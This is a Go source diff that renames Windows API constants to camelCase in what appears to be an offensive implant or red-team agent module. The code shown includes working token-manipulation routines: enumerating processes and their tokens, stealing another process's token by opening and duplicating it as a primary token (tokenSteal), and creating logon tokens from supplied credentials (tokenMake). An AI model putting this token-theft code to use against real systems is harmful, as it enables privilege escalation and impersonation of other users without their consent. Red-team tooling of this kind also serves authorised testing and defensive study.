@@ -23,19 +23,19 @@ var (
 )
 
 const (
-	TOKEN_DUPLICATE           = 0x0002
-	TOKEN_IMPERSONATE         = 0x0004
-	TOKEN_QUERY               = 0x0008
-	TOKEN_ALL_ACCESS_TOKEN    = 0xF01FF
-	TokenUser                 = 1
-	TokenIntegrityLevel       = 25
-	TokenType_Token           = 8
-	SecurityImpersonation     = 2
-	TokenImpersonation        = 2
-	TokenPrimary              = 1
-	LOGON32_LOGON_INTERACTIVE = 2
-	LOGON32_LOGON_NETWORK     = 3
-	LOGON32_PROVIDER_DEFAULT  = 0
+	tokenDuplicate          = 0x0002
+	tokenImpersonate        = 0x0004
+	tokenQuery              = 0x0008
+	tokenAllAccessToken     = 0xF01FF
+	TokenUser               = 1
+	TokenIntegrityLevel     = 25
+	tokenTypeToken          = 8
+	SecurityImpersonation   = 2
+	TokenImpersonation      = 2
+	TokenPrimary            = 1
+	logon32LogonInteractive = 2
+	logon32LogonNetwork     = 3
+	logon32ProviderDefault  = 0
 )
 
 type tokenInfoResult struct {
@@ -51,10 +51,10 @@ type tokenInfoResult struct {
 func getCurrentTokenUser() string {
 	var hToken uintptr
 	currentThread, _, _ := k32.NewProc("GetCurrentThread").Call()
-	advapi32.NewProc("OpenThreadToken").Call(currentThread, TOKEN_QUERY, 1, uintptr(unsafe.Pointer(&hToken)))
+	advapi32.NewProc("OpenThreadToken").Call(currentThread, tokenQuery, 1, uintptr(unsafe.Pointer(&hToken)))
 	if hToken == 0 {
 		currentProcess, _, _ := k32.NewProc("GetCurrentProcess").Call()
-		procOpenProcessToken.Call(currentProcess, TOKEN_QUERY, uintptr(unsafe.Pointer(&hToken)))
+		procOpenProcessToken.Call(currentProcess, tokenQuery, uintptr(unsafe.Pointer(&hToken)))
 	}
 	if hToken == 0 {
 		return "(unknown)"
@@ -135,7 +135,7 @@ func getTokenIntegrity(hToken uintptr) string {
 }
 
 func tokenListProcesses() ([]tokenInfoResult, error) {
-	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
+	snap, _, _ := procCreateToolhelp32Snapshot.Call(th32csSnapProcess, 0)
 	if snap == 0 || snap == ^uintptr(0) {
 		return nil, fmt.Errorf("CreateToolhelp32Snapshot failed")
 	}
@@ -160,13 +160,13 @@ func tokenListProcesses() ([]tokenInfoResult, error) {
 		}
 
 		hProc, _, _ := procOpenProcess.Call(
-			uintptr(PROCESS_QUERY_INFORMATION),
+			uintptr(processQueryInformation),
 			0,
 			uintptr(pid),
 		)
 		if hProc != 0 {
 			var hToken uintptr
-			tokRet, _, _ := procOpenProcessToken.Call(hProc, TOKEN_QUERY, uintptr(unsafe.Pointer(&hToken)))
+			tokRet, _, _ := procOpenProcessToken.Call(hProc, tokenQuery, uintptr(unsafe.Pointer(&hToken)))
 			if tokRet != 0 && hToken != 0 {
 				res.Username = getTokenUsername(hToken)
 				res.Integrity = getTokenIntegrity(hToken)
@@ -194,12 +194,12 @@ var activeTokenHandle uintptr
 
 func tokenSteal(pid uint32) (domain, username, integrity string, err error) {
 	hProc, _, _ := procOpenProcess.Call(
-		uintptr(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ),
+		uintptr(processQueryInformation|processVMRead),
 		0,
 		uintptr(pid),
 	)
 	if hProc == 0 {
-		hProc, _, _ = procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
+		hProc, _, _ = procOpenProcess.Call(uintptr(processAllAccess), 0, uintptr(pid))
 	}
 	if hProc == 0 {
 		return "", "", "", fmt.Errorf("OpenProcess pid=%d failed (check privileges)", pid)
@@ -207,7 +207,7 @@ func tokenSteal(pid uint32) (domain, username, integrity string, err error) {
 	defer procCloseHandle.Call(hProc)
 
 	var hToken uintptr
-	ret, _, le := procOpenProcessToken.Call(hProc, TOKEN_DUPLICATE|TOKEN_QUERY|TOKEN_IMPERSONATE, uintptr(unsafe.Pointer(&hToken)))
+	ret, _, le := procOpenProcessToken.Call(hProc, tokenDuplicate|tokenQuery|tokenImpersonate, uintptr(unsafe.Pointer(&hToken)))
 	if ret == 0 {
 		return "", "", "", fmt.Errorf("OpenProcessToken failed: %v", le)
 	}
@@ -221,7 +221,7 @@ func tokenSteal(pid uint32) (domain, username, integrity string, err error) {
 	var hDup uintptr
 	ret, _, le = procDuplicateTokenEx.Call(
 		hToken,
-		uintptr(TOKEN_ALL_ACCESS_TOKEN),
+		uintptr(tokenAllAccessToken),
 		0,
 		uintptr(SecurityImpersonation),
 		uintptr(TokenPrimary),
@@ -268,12 +268,12 @@ func tokenMake(domainUser, password, logonTypeStr string) (domain, username, int
 		dom = "."
 	}
 
-	logonType := uint32(LOGON32_LOGON_INTERACTIVE)
+	logonType := uint32(logon32LogonInteractive)
 	switch strings.ToLower(strings.TrimSpace(logonTypeStr)) {
 	case "network", "3":
-		logonType = LOGON32_LOGON_NETWORK
+		logonType = logon32LogonNetwork
 	case "interactive", "2", "":
-		logonType = LOGON32_LOGON_INTERACTIVE
+		logonType = logon32LogonInteractive
 	}
 
 	userPtr, _ := syscall.UTF16PtrFromString(user)
@@ -286,7 +286,7 @@ func tokenMake(domainUser, password, logonTypeStr string) (domain, username, int
 		uintptr(unsafe.Pointer(domPtr)),
 		uintptr(unsafe.Pointer(passPtr)),
 		uintptr(logonType),
-		LOGON32_PROVIDER_DEFAULT,
+		logon32ProviderDefault,
 		uintptr(unsafe.Pointer(&hToken)),
 	)
 	if ret == 0 {
